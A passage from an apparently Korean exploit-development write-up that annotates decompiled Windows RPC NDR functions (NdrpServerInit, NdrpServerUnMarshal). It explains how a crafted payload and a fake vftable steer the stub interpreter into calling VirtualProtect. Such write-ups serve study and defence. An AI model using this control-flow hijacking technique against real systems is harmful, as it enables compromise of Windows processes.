      NdrServerInitializePartial(pRpcMsg, StubMsg, pMidlStubDesc, *v17);
    }
    <span class="hljs-keyword">else</span>
    {
      StubMsg-&gt;_bf_c0 &amp;= <span class="hljs-number">0xFFFFEBD4</span>;
      StubMsg-&gt;IsClient = <span class="hljs-number">0</span>;
      StubMsg-&gt;pAllocAllNodesContext = <span class="hljs-number">0</span>i64;
      StubMsg-&gt;pPointerQueueState = <span class="hljs-number">0</span>i64;
      StubMsg-&gt;IgnoreEmbeddedPointers = <span class="hljs-number">0</span>;
      StubMsg-&gt;PointerBufferMark = <span class="hljs-number">0</span>i64;
      StubMsg-&gt;BufferLength = <span class="hljs-number">0</span>;
      StubMsg-&gt;StackTop = <span class="hljs-number">0</span>i64;
      StubMsg-&gt;FullPtrXlatTables = <span class="hljs-number">0</span>i64;
      *(_QWORD *)&amp;StubMsg-&gt;FullPtrRefId = <span class="hljs-number">0</span>i64;
      StubMsg-&gt;UniquePtrCount = <span class="hljs-number">0</span>;
      StubMsg-&gt;dwDestContext = <span class="hljs-number">2</span>;
      StubMsg-&gt;pvDestContext = <span class="hljs-number">0</span>i64;
      StubMsg-&gt;pRpcChannelBuffer = <span class="hljs-number">0</span>i64;
      StubMsg-&gt;pArrayInfo = <span class="hljs-number">0</span>i64;
      StubMsg-&gt;RpcMsg = pRpcMsg;
      StubMsg-&gt;Buffer = (<span class="hljs-keyword">unsigned</span> __int8 *)pRpcMsg-&gt;Buffer;
      MyBuffer = (<span class="hljs-keyword">unsigned</span> __int8 *)pRpcMsg-&gt;Buffer;
      StubMsg-&gt;BufferStart = MyBuffer;
      BufferLen = pRpcMsg-&gt;BufferLength;
      StubMsg-&gt;_bf_c0 &amp;= <span class="hljs-number">0xFFFFF63F</span>;
      StubMsg-&gt;BufferEnd = &amp;MyBuffer[BufferLen];
      StubMsg-&gt;uFlags = <span class="hljs-number">0</span>;
      StubMsg-&gt;uFlags2 = <span class="hljs-number">0</span>;
      StubMsg-&gt;pfnAllocate = pMidlStubDesc-&gt;pfnAllocate;
      StubMsg-&gt;pfnFree = pMidlStubDesc-&gt;pfnFree;
      StubMsg-&gt;StubDesc = pMidlStubDesc;
      StubMsg-&gt;LowStackMark = &amp;v34 - <span class="hljs-number">1525</span>;
      StubMsg-&gt;ReuseBuffer = <span class="hljs-number">0</span>;
      StubMsg-&gt;dwStubPhase = <span class="hljs-number">0</span>;
      StubMsg-&gt;CorrDespIncrement = <span class="hljs-number">0</span>;
      StubMsg-&gt;pAsyncMsg = <span class="hljs-number">0</span>i64;
      StubMsg-&gt;pCorrInfo = <span class="hljs-number">0</span>i64;
      StubMsg-&gt;pCorrMemory = <span class="hljs-number">0</span>i64;
      StubMsg-&gt;pMemoryList = <span class="hljs-number">0</span>i64;
      v20 = (<span class="hljs-keyword">unsigned</span> __int64)NtCurrentTeb()-&gt;ReservedForNtRpc;
      <span class="hljs-keyword">if</span> ( v20 )
      {
        v21 = (struct THREAD *)(v20 ^ <span class="hljs-number">0xABABABABDEDEDEDE</span>ui64);
        <span class="hljs-keyword">if</span> ( (HANDLE)*((_QWORD *)v21 + <span class="hljs-number">2</span>) != NtCurrentTeb()-&gt;ClientId.UniqueThread )
          __fastfail(<span class="hljs-number">0x1E</span>u);
      }
      <span class="hljs-keyword">else</span>
      {
        v21 = ThreadSelfHelper();
      }
      <span class="hljs-keyword">if</span> ( !v21 )
        RpcRaiseException(<span class="hljs-number">14</span>);
      *((_QWORD *)v21 + <span class="hljs-number">11</span>) = StubMsg;
      v22 = pMidlStubDesc-&gt;pMallocFreeStruct;
      <span class="hljs-keyword">if</span> ( v22 )
      {
        v29 = v22-&gt;pfnFree;
        v30 = pRpcSsDefaults;
        pRpcSsDefaults-&gt;pfnAllocate = v22-&gt;pfnAllocate;
        v30-&gt;pfnFree = v29;
      }
      <span class="hljs-keyword">if</span> ( pMidlStubDesc-&gt;Version &gt; <span class="hljs-number">0xA0000</span> )
        RpcRaiseException(<span class="hljs-number">1829</span>);
      <span class="hljs-keyword">if</span> ( (pRpcMsg-&gt;RpcFlags &amp; <span class="hljs-number">0x1000</span>) == <span class="hljs-number">0</span> )  <span class="hljs-comment">// RpcFlags -&gt; 0x1000</span>
      {
        pRpcMsg-&gt;RpcFlags = <span class="hljs-number">0x4000</span>;
        v31 = I_RpcReceive(pRpcMsg, <span class="hljs-number">0</span>);
        <span class="hljs-keyword">if</span> ( v31 )
          RpcRaiseException(v31);
        StubMsg-&gt;Buffer = (<span class="hljs-keyword">unsigned</span> __int8 *)pRpcMsg-&gt;Buffer;
        v32 = (<span class="hljs-keyword">unsigned</span> __int8 *)pRpcMsg-&gt;Buffer;
        StubMsg-&gt;BufferStart = v32;
        StubMsg-&gt;BufferEnd = &amp;v32[pRpcMsg-&gt;BufferLength];
      }
    }
  }
  <span class="hljs-keyword">if</span> ( a6 )                                     <span class="hljs-comment">// a6 == 0</span>
  {
    ...
  }
  <span class="hljs-keyword">if</span> ( (*(_BYTE *)(Context-&gt;<span class="hljs-keyword">union</span>.NdrInfo.pProcDesc + <span class="hljs-number">4</span>) &amp; <span class="hljs-number">8</span>) != <span class="hljs-number">0</span> )<span class="hljs-comment">//Flags</span>
    ((<span class="hljs-keyword">void</span> (__usercall *)(struct _MIDL_STUB_MESSAGE *@&lt;rcx&gt;, struct _NDR_ALLOCA_CONTEXT *@&lt;rdx&gt;, <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> __int8 *@&lt;r8&gt;, __int64@&lt;r9&gt;, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>))NdrpPipesInitialize32)(
      StubMsg,
      (struct _NDR_ALLOCA_CONTEXT *)&amp;Context-&gt;AllocateContext,
      (<span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> __int8 *)Context-&gt;Params,
      (__int64)StartOfStack,
      Context-&gt;NumberParams);
  <span class="hljs-keyword">if</span> ( (Context-&gt;<span class="hljs-keyword">union</span>.NdrInfo.InterpreterFlags &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )
    StubMsg-&gt;FullPtrXlatTables = NdrFullPointerXlatInit(<span class="hljs-number">0</span>, XLAT_SERVER);
  <span class="hljs-keyword">else</span>
    StubMsg-&gt;FullPtrXlatTables = <span class="hljs-number">0</span>i64;
  StubMsg-&gt;_bf_c0 |= <span class="hljs-number">0x100</span>u;
  StubMsg-&gt;StackTop = (<span class="hljs-keyword">unsigned</span> __int8 *)StartOfStack;
  StubMsg-&gt;pUserMarshalList = <span class="hljs-number">0</span>i64;
  <span class="hljs-keyword">if</span> ( (Context-&gt;<span class="hljs-keyword">union</span>.NdrInfo.InterpreterFlags &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span> )
    NdrRpcSsEnableAllocate(StubMsg);
  ProcDesc2 = (<span class="hljs-keyword">unsigned</span> __int8 *)Context-&gt;<span class="hljs-keyword">union</span>.NdrInfo.pProcDesc;
  <span class="hljs-keyword">if</span> ( (ProcDesc2[<span class="hljs-number">4</span>] &amp; <span class="hljs-number">0x40</span>) != <span class="hljs-number">0</span> )<span class="hljs-comment">//Flags</span>
  {
    ...
  }
  <span class="hljs-keyword">return</span> ProcDesc2;
}</code></pre>
<p>ProcDesc&#xC758; &#xD50C;&#xB798;&#xADF8;&#xC5D0; &#xB530;&#xB77C; &#xBD84;&#xAE30;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xB9CE;&#xC740; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;?  if&#xB85C; ProcDesc&#xC758; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xBCF4;&#xBA74; <code>NdrpPipesInitialize</code>&#xB098; <code>NdrServerInitializePartial</code> &#xB4F1; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xD638;&#xCD9C;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB4E4;&#xC740; &#xAD73;&#xC774; &#xD638;&#xCD9C;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xC5B4; &#xBCF4;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB4A4;&#xC5D0; &#xB098;&#xC62C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC5D0;&#xC11C;&#xB3C4; &#xC774;&#xB97C; &#xAC74;&#xB108;&#xB6F8; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC124;&#xC815;&#xD574;&#xC92C;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>StubMsg</code>&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; <code>RpcMsg</code>&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xC778;&#xC790;&#xAC00; &#xC800;&#xC7A5;&#xB41C; &#xBC84;&#xD37C;&#xC758; &#xC2DC;&#xC791;&#xACFC; &#xB05D;&#xC774; <code>pStubMsg</code>&#xC758; <code>Buffer</code>, <code>BufferStart</code>&#xC640; <code>BufferEnd</code>&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5C8;&#xB124;&#xC694;. &#xC774;&#xD6C4; &#xCD08;&#xAE30;&#xD654;&#xB41C; <code>StubMsg</code>&#xB85C; <code>NdrpServerUnMarshal</code>&#xC774; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;</p>
<h3 id="Argument-Parsing-NdrpServerUnMarshal"><a href="#Argument-Parsing-NdrpServerUnMarshal" class="headerlink" title="Argument Parsing(NdrpServerUnMarshal)"></a>Argument Parsing(<code>NdrpServerUnMarshal</code>)</h3><p>&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC720;&#xC77C;&#xD55C; &#xC778;&#xC790;&#xB85C; <code>NdrpServerInit</code>&#xC5D0;&#xC11C; &#xCD08;&#xAE30;&#xD654;&#xB41C; <code>StubMsg</code>&#xB97C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs C">NdrpServerUnMarshal(&amp;pStubMsg);</code></pre></p>
<pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">NdrpServerUnMarshal</span><span class="hljs-params">(struct _MIDL_STUB_MESSAGE *pStubMsg1)</span></span>
<span class="hljs-function"></span>{
  pContext1 = pStubMsg1-&gt;pContext;
  v3 = pContext1-&gt;DceTypeFormatString;
  isDataRep0x10 = LOWORD(pStubMsg1-&gt;RpcMsg-&gt;DataRepresentation) == <span class="hljs-number">0x10</span>;
  Params = (__int16 *)pContext1-&gt;Params;
  v64 = v3;
  <span class="hljs-keyword">if</span> ( !isDataRep0x10 )
  {
    NdrConvert2(pStubMsg1, (PFORMAT_STRING)Params, pContext1-&gt;NumberParams);
    v3 = v64;
  }
  v6 = <span class="hljs-number">0</span>i64;
  i = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">if</span> ( pContext1-&gt;NumberParams )
  {
    v8 = <span class="hljs-number">0x2000</span>i64;
    <span class="hljs-keyword">do</span>
    {
      flag = Params[<span class="hljs-number">3</span> * i];                     <span class="hljs-comment">// Param + i*3 (0,6,9,12...)</span>
      <span class="hljs-keyword">if</span> ( (flag &amp; <span class="hljs-number">0xC</span>) == <span class="hljs-number">8</span> )
      {
        StackIndex = (<span class="hljs-keyword">unsigned</span> __int16)Params[<span class="hljs-number">3</span> * i + <span class="hljs-number">1</span>];<span class="hljs-comment">// Params + i*3 + 1 (1,7,10,13...)</span>
        <span class="hljs-keyword">if</span> ( (flag &amp; <span class="hljs-number">0x800</span>) != <span class="hljs-number">0</span> )
        {
          StackBufferPointer = (<span class="hljs-keyword">int</span> *)&amp;pContext1-&gt;StartofStack[StackIndex];
          v47 = (<span class="hljs-keyword">unsigned</span> __int64)(pStubMsg1-&gt;Buffer + <span class="hljs-number">3</span>);
          v65 = StackBufferPointer;
          v47 &amp;= <span class="hljs-number">0xFFFFFFFFFFFFFFFC</span>ui64;        <span class="hljs-comment">// align</span>
          pStubMsg1-&gt;Buffer = (<span class="hljs-keyword">unsigned</span> __int8 *)v47;
          *(_QWORD *)StackBufferPointer = *(_DWORD *)v47 != <span class="hljs-number">0</span>;
          pStubMsg1-&gt;Buffer += <span class="hljs-number">4</span>;
        }
        <span class="hljs-keyword">else</span>
        {
          StackBufferPointer1 = (<span class="hljs-keyword">int</span> *)&amp;pContext1-&gt;StartofStack[StackIndex];
          v65 = StackBufferPointer1;
          flag2 = Params[<span class="hljs-number">3</span> * i];
          <span class="hljs-keyword">if</span> ( (flag2 &amp; <span class="hljs-number">0x40</span>) != <span class="hljs-number">0</span> )
          {
            <span class="hljs-keyword">if</span> ( (flag2 &amp; <span class="hljs-number">0x100</span>) == <span class="hljs-number">0</span> )
            {
              <span class="hljs-keyword">if</span> ( LOBYTE(Params[<span class="hljs-number">3</span> * i + <span class="hljs-number">2</span>]) == <span class="hljs-number">8</span> )
              {
LABEL_34:
                v28 = (<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">unsigned</span> __int64)(pStubMsg1-&gt;Buffer + <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFC</span>ui64);<span class="hljs-comment">// align 0x4</span>
                pStubMsg1-&gt;Buffer = (<span class="hljs-keyword">unsigned</span> __int8 *)v28;<span class="hljs-comment">// align Buffer</span>
                ParamValue = *v28;
LABEL_35:
                *(_QWORD *)StackBufferPointer1 = ParamValue;<span class="hljs-comment">// Copy data from my RPC_MESSAGE buffer to NDR_PROC_CONTEXT.AllocateContext.PreAllocateBlock(Real Buffer used calling Invoke)</span>
LABEL_36:
                pStubMsg1-&gt;Buffer += <span class="hljs-number">4</span>;
              }
              <span class="hljs-keyword">else</span>
              {
               ...
              }
              <span class="hljs-keyword">if</span> ( pStubMsg1-&gt;Buffer &gt; pStubMsg1-&gt;BufferEnd )
                RpcRaiseException(<span class="hljs-number">1783</span>);
              <span class="hljs-keyword">goto</span> LABEL_23;
            }
            v34 = *((<span class="hljs-keyword">unsigned</span> __int8 *)&amp;_ImageBase + LOBYTE(Params[<span class="hljs-number">3</span> * i + <span class="hljs-number">2</span>]) + <span class="hljs-number">0xEDB20</span>);
            v35 = (<span class="hljs-keyword">unsigned</span> __int8 *)(~v34 &amp; (__int64)&amp;pStubMsg1-&gt;Buffer[v34]);
            pStubMsg1-&gt;Buffer = v35;
            v36 = Params[<span class="hljs-number">3</span> * i + <span class="hljs-number">2</span>];
            <span class="hljs-keyword">if</span> ( v36 == <span class="hljs-number">-72</span> || v36 == <span class="hljs-number">-71</span> )
            {
              <span class="hljs-keyword">if</span> ( pContext1-&gt;AllocateContext.BytesRemaining &lt; <span class="hljs-number">0x10</span>ui64 )
              {
                v48 = (_LIST_ENTRY *)I_RpcBCacheAllocate(<span class="hljs-number">0x1000</span>ui64);
                <span class="hljs-keyword">if</span> ( !v48 )
                  RpcRaiseException(<span class="hljs-number">14</span>);
                v49 = &amp;pContext1-&gt;AllocateContext.MemoryList;
                v50 = pContext1-&gt;AllocateContext.MemoryList.Flink;
                <span class="hljs-keyword">if</span> ( v50-&gt;Blink != &amp;pContext1-&gt;AllocateContext.MemoryList )
                  __fastfail(<span class="hljs-number">3u</span>);
                v48-&gt;Flink = v50;
                v8 = <span class="hljs-number">0x2000</span>i64;
                v48-&gt;Blink = v49;
                v50-&gt;Blink = v48;
                v49-&gt;Flink = v48;
                pContext1-&gt;AllocateContext.pBlockPointer = (__int64)&amp;v48[<span class="hljs-number">1</span>];
                pContext1-&gt;AllocateContext.BytesRemaining = <span class="hljs-number">4080</span>i64;
              }
              pContext1-&gt;AllocateContext.BytesRemaining -= <span class="hljs-number">0x10</span>i64;
              v51 = (_QWORD *)pContext1-&gt;AllocateContext.pBlockPointer;
              v3 = v64;
              pContext1-&gt;AllocateContext.pBlockPointer = (__int64)(v51 + <span class="hljs-number">2</span>);
              *(_QWORD *)v65 = v51;
              v52 = pStubMsg1-&gt;Buffer;
              <span class="hljs-keyword">if</span> ( LOBYTE(Params[<span class="hljs-number">3</span> * i + <span class="hljs-number">2</span>]) == <span class="hljs-number">0xB8</span> )
                *v51 = *(<span class="hljs-keyword">int</span> *)v52;
              <span class="hljs-keyword">else</span>
                **(_QWORD **)v65 = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)v52;
              pStubMsg1-&gt;Buffer += <span class="hljs-number">4</span>;
              <span class="hljs-keyword">goto</span> LABEL_23;
            }
            *(_QWORD *)StackBufferPointer1 = v35;
            pStubMsg1-&gt;Buffer += *((<span class="hljs-keyword">unsigned</span> __int8 *)&amp;_ImageBase + LOBYTE(Params[<span class="hljs-number">3</span> * i + <span class="hljs-number">2</span>]) + <span class="hljs-number">973408</span>);
            <span class="hljs-keyword">if</span> ( pStubMsg1-&gt;Buffer &gt; pStubMsg1-&gt;BufferEnd )
              RpcRaiseException(<span class="hljs-number">1783</span>);
          }
          <span class="hljs-keyword">else</span>
          {
            ...
          }
          v3 = v64;
        }
      }
LABEL_23:
      ++i;
    }
    <span class="hljs-keyword">while</span> ( i &lt; pContext1-&gt;NumberParams );
  }
  v21 = pStubMsg1-&gt;pCorrInfo;
  <span class="hljs-keyword">if</span> ( v21 )<span class="hljs-comment">//NULL</span>
  {
	  ...
  }
  v22 = pStubMsg1-&gt;Buffer;
  v23 = pStubMsg1-&gt;BufferEnd;
  v24 = pStubMsg1-&gt;RpcMsg;
  <span class="hljs-keyword">if</span> ( v22 + <span class="hljs-number">8</span> &lt; v23 )
  {
    ...
  }
LABEL_26:
  v25 = pStubMsg1-&gt;RpcMsg;
  v26 = (LRPC_SCALL *)pStubMsg1-&gt;RpcMsg-&gt;Handle;
  <span class="hljs-keyword">if</span> ( v26 )<span class="hljs-comment">//corrupted vftable</span>
  {
    <span class="hljs-keyword">if</span> ( (pStubMsg1-&gt;pContext-&gt;Flags &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span> )
    {
      LODWORD(v25) = (*((__int64 (__fastcall **)(struct _MIDL_STUB_MESSAGE *))pNdrOleExtensionsTable + <span class="hljs-number">20</span>))(pStubMsg1);
    }
    <span class="hljs-keyword">else</span>
    {
      v27 = *(<span class="hljs-keyword">int</span> (__fastcall **)(LRPC_SCALL *, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>))(*(_QWORD *)v26 + <span class="hljs-number">0x100</span>i64);
      <span class="hljs-keyword">if</span> ( v27 == LRPC_SCALL::CleanupSystemHandles )
        LODWORD(v25) = LRPC_SCALL::CleanupSystemHandles(v26, <span class="hljs-number">5u</span>);
      <span class="hljs-keyword">else</span>
        LODWORD(v25) = v27(v26, <span class="hljs-number">5u</span>);<span class="hljs-comment">//call function of vftable+0x100</span>
      <span class="hljs-keyword">if</span> ( (_DWORD)v25 )<span class="hljs-comment">//if return value is not 0</span>
        RpcRaiseException(<span class="hljs-number">1783</span>);<span class="hljs-comment">//Exception :(</span>
    }
  }
  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>)v25;
}</code></pre>
<p><code>RpcMsg</code>&#xC758; <code>DataRepresentation</code>&#xC774; 0x10&#xC774; &#xC544;&#xB2C8;&#xBA74; <code>NdrConvert2</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xB294;&#xB370; &#xC774; &#xBD80;&#xBD84;&#xB3C4; &#xAC74;&#xB108;&#xB6F8; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC774;&#xD6C4; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC5D0;&#xC11C; &#xC124;&#xC815;&#xD574;&#xC90D;&#xC2DC;&#xB2E4;. &#xC774;&#xD6C4; &#xB3D9;&#xC791;&#xC744; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xBA74; ProcString&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB41C; Param&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; <code>pContext-&gt;Params</code>&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xCC38;&#xACE0;&#xD574;&#xC11C; <code>pStubMsg-&gt;Buffer</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; <code>RpcMsg-&gt;Buffer</code>&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD574;&#xC11C; <code>NdrStubCall2</code>&#xC758; &#xC2A4;&#xD0DD;&#xC73C;&#xB85C; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. Params&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xBA74; 2&#xBC14;&#xC774;&#xD2B8; &#xD544;&#xB4DC; &#xC138; &#xAC1C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC838; &#xC788;&#xACE0; &#xAC01;&#xAC01; Flag, &#xC2A4;&#xD0DD;&#xC5D0;&#xC11C;&#xC758; &#xC778;&#xB371;&#xC2A4;, &#xC778;&#xC790;&#xC758; &#xD06C;&#xAE30;(?)&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.<br>Flag &#xAC12;&#xACFC; &#xC778;&#xC790;&#xC758; &#xD06C;&#xAE30;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB978; &#xB3D9;&#xC791;&#xC774; &#xC218;&#xD589;&#xB418;&#xB294;&#xB370; Flag&#xAC00; 0x48&#xC77C; &#xB54C;&#xC758; &#xB3D9;&#xC791;&#xC744; &#xBCF4;&#xC2DC;&#xC8E0;</p>
<pre><code class="hljs C"><span class="hljs-keyword">if</span> ( (flag &amp; <span class="hljs-number">0xC</span>) == <span class="hljs-number">8</span> )
      {
        StackIndex = (<span class="hljs-keyword">unsigned</span> __int16)Params[<span class="hljs-number">3</span> * i + <span class="hljs-number">1</span>];<span class="hljs-comment">// Params + i*3 + 1 (1,7,10,13...)</span>
        <span class="hljs-keyword">if</span> ( (flag &amp; <span class="hljs-number">0x800</span>) != <span class="hljs-number">0</span> )
        {
          ...
        }
        <span class="hljs-keyword">else</span>
        {
          StackBufferPointer1 = (<span class="hljs-keyword">int</span> *)&amp;pContext1-&gt;StartofStack[StackIndex];
          v65 = StackBufferPointer1;
          flag2 = Params[<span class="hljs-number">3</span> * i];
          <span class="hljs-keyword">if</span> ( (flag2 &amp; <span class="hljs-number">0x40</span>) != <span class="hljs-number">0</span> )
          {
            <span class="hljs-keyword">if</span> ( (flag2 &amp; <span class="hljs-number">0x100</span>) == <span class="hljs-number">0</span> )
            {
              <span class="hljs-keyword">if</span> ( LOBYTE(Params[<span class="hljs-number">3</span> * i + <span class="hljs-number">2</span>]) == <span class="hljs-number">8</span> )
              {
LABEL_34:
                v28 = (<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">unsigned</span> __int64)(pStubMsg1-&gt;Buffer + <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFC</span>ui64);<span class="hljs-comment">// align 0x4</span>
                pStubMsg1-&gt;Buffer = (<span class="hljs-keyword">unsigned</span> __int8 *)v28;<span class="hljs-comment">// align Buffer</span>
                ParamValue = *v28;
LABEL_35:
                *(_QWORD *)StackBufferPointer1 = ParamValue;<span class="hljs-comment">// Copy data from my RPC_MESSAGE buffer to NDR_PROC_CONTEXT.AllocateContext.PreAllocateBlock(Real Buffer used calling Invoke)</span>
LABEL_36:
                pStubMsg1-&gt;Buffer += <span class="hljs-number">4</span>;</code></pre>
<p><code>pStubMsg-&gt;Buffer</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xC5D0;&#xC11C; 4&#xBC14;&#xC774;&#xD2B8; &#xB9CC;&#xD07C;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; <code>pContext-&gt;StartofStack[StackIndex]</code>&#xC5D0; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;! 8&#xBC14;&#xC774;&#xD2B8; &#xC778;&#xC790; &#xD558;&#xB098;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xB824;&#xBA74; &#xC778;&#xC790; &#xD06C;&#xAE30;&#xAC00; 8&#xC774;&#xACE0; StackIndex&#xAC00; &#xAC01;&#xAC01; 0, 4&#xC778; Param &#xB450; &#xAC1C;&#xAC00; &#xD544;&#xC694;&#xD558;&#xACA0;&#xB124;&#xC694;!</p>
<p>&#xADF8;&#xB9AC;&#xACE0; <code>NdrpServerUnMarshal</code>&#xC774; &#xB9AC;&#xD134;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD55C; &#xAC00;&#xC9C0; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs C">LABEL_26:
  v25 = pStubMsg1-&gt;RpcMsg;
  v26 = (LRPC_SCALL *)pStubMsg1-&gt;RpcMsg-&gt;Handle;<span class="hljs-comment">//VideoDirtListener, first entry of fake vftable</span>
  <span class="hljs-keyword">if</span> ( v26 )
  {
    <span class="hljs-keyword">if</span> ( (pStubMsg1-&gt;pContext-&gt;Flags &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span> )
    {
      ...
    }
    <span class="hljs-keyword">else</span>
    {
      v27 = *(<span class="hljs-keyword">int</span> (__fastcall **)(LRPC_SCALL *, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>))(*(_QWORD *)v26 + <span class="hljs-number">0x100</span>i64);
      <span class="hljs-keyword">if</span> ( v27 == LRPC_SCALL::CleanupSystemHandles )
        LODWORD(v25) = LRPC_SCALL::CleanupSystemHandles(v26, <span class="hljs-number">5u</span>);
      <span class="hljs-keyword">else</span>
        LODWORD(v25) = v27(v26, <span class="hljs-number">5u</span>);
      <span class="hljs-keyword">if</span> ( (_DWORD)v25 )
        RpcRaiseException(<span class="hljs-number">1783</span>);
    }
  }
  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>)v25;
}</code></pre><br><code>RpcMsg</code>&#xC758; &#xC8FC;&#xC18C;&#xB294; &#xC6D0;&#xB798; <code>VideoDirtListener</code>&#xC774;&#xACE0; <code>Handle</code>&#xC758; &#xC624;&#xD504;&#xC14B;&#xC778; 0&#xC5D0;&#xB294; &#xAC00;&#xC9DC; vftable&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>v26</code>&#xC740; &#xC774; &#xAC00;&#xC9DC; vftable&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xC5D4;&#xD2B8;&#xB9AC;&#xC758; &#xAC12;&#xC744; &#xAC00;&#xC9C0;&#xAC8C; &#xB418;&#xACE0; &#xC5EC;&#xAE30;&#xC5D0; 0x100&#xC744; &#xB354;&#xD55C; &#xC8FC;&#xC18C;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xAC12;&#xC774; 0&#xC774; &#xC544;&#xB2C8;&#xB77C;&#xBA74; &#xC774;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0; &#xB610;&#xD55C; &#xBC18;&#xD658; &#xAC12;&#xC774; 0&#xC774; &#xC544;&#xB2C8;&#xBA74; &#xC608;&#xC678;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB0E5; &#xAC00;&#xC9DC; vftable&#xC758; &#xCCAB; &#xC5D4;&#xD2B8;&#xB9AC;&#xB97C; 0&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC8FC;&#xBA74; if &#xBB38;&#xC73C;&#xB85C; &#xC9C4;&#xC785;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xC11C; &#xBC14;&#xB85C; &#xB9AC;&#xD134;&#xD558;&#xB294;&#xAC70; &#xC544;&#xB2C8;&#xB0D0;&#xACE0;&#xC694;? &#xC774; &#xBD80;&#xBD84;&#xC774; <code>NdrStubCall2</code>&#xC5D0;&#xC11C; &#xB610; &#xCC38;&#xC870;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; 0&#xC73C;&#xB85C; &#xB9CC;&#xB4E4; &#xC218;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4; &#x3160;&#x3160; &#xB530;&#xB77C;&#xC11C; &#xC774; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB420; &#xD568;&#xC218;&#xB97C; <code>VirtualProtect</code>&#xB85C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. <code>VirtualProtect</code>&#xB294; &#xC798;&#xBABB;&#xB41C; &#xC778;&#xC790;&#xB85C; &#xD638;&#xCD9C;&#xB418;&#xAC70;&#xB098; &#xD558;&#xB294; &#xB4F1;&#xC758; &#xC774;&#xC720;&#xB85C; &#xB3D9;&#xC791;&#xC774; &#xC2E4;&#xD328;&#xD588;&#xC744; &#xB54C; 0&#xC744; &#xBC18;&#xD658;&#xD558;&#xAE30; 